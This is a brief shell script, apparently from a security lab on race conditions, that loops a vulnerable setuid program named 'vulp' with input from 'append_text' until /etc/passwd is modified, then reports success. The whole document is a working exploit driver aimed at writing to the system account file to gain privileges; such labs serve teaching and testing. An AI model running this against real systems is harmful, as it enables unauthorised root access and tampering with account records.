#!/bin/sh
#old=`ls -l /home/aimee/race_condition/root_file`
#new=`ls -l /home/aimee/race_condition/root_file`
old=`ls -l /etc/passwd`
new=`ls -l /etc/passwd`
while [ "$old" = "$new" ]
do
	./vulp < append_text
	new=`ls -l /etc/passwd`
done
echo "STOP...The file has been changed"
